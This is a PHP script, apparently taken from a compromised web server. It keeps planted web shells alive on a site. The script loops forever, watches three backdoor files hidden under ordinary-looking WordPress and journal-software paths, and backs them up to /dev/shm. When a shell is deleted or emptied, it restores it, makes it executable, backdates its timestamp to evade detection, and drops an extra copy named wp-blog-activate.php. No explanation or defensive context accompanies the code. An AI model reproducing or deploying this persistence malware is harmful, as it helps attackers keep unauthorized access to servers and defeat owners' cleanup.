<?php
ignore_user_abort(true);
set_time_limit(0);

$dir = dirname(__FILE__);
$shells = [
    '/home/indiein1/public_html/scienceinpubs/wp-admin/user/cache.php',
    '/home/indiein1/public_html/scienceinpubs/journal/plugins/themes/default/locale/pt_BR/index.php',
    '/home/indiein1/public_html/scienceinpubs/journal/lib/pkp/lib/vendor/ramsey/uuid/src/Codec/TimestampCodec.php',
];

$newName = "/home/indiein1/public_html/scienceinpubs/wp-blog-activate.php"; 

function restoreWithTimestamp($backup, $target, $newName) {
    $timestampFile = $backup . '.time';
    
    if (file_exists($timestampFile)) {
        $oldTimestamp = (int)file_get_contents($timestampFile);
    } else {
        $oldTimestamp = strtotime('2023-01-01 00:00:00');
    }
    
    @copy($backup, $target);
    @chmod($target, 0755);
    
    @touch($target, $oldTimestamp);
    
    @copy($backup, $newName);
    @chmod($newName, 0755);
    @touch($newName, $oldTimestamp);
}

while (true) {
    foreach ($shells as $shell) {
        $target = $shell;
        $backup = '/dev/shm/shmdata/' . md5($shell) . '.bak';
        $timestampFile = $backup . '.time';

        if (!is_dir('/dev/shm/shmdata')) {
            @mkdir('/dev/shm/shmdata', 0777, true);
        }

        if ((file_exists($target) && filesize($target) == 0) || !file_exists($target)) {
            
            if (file_exists($target)) {
                @unlink($target);
            }

            sleep(30);
            
            if (file_exists($backup)) {
                restoreWithTimestamp($backup, $target, $newName);
            }
        } 
        
        else {
            if (!file_exists($backup) || md5_file($target) !== md5_file($backup)) {
                @file_put_contents($backup, file_get_contents($target));
                @chmod($backup, 0444);
                
                $currentTimestamp = filemtime($target);
                @file_put_contents($timestampFile, $currentTimestamp);
            }
        }
    }
    sleep(10);
}
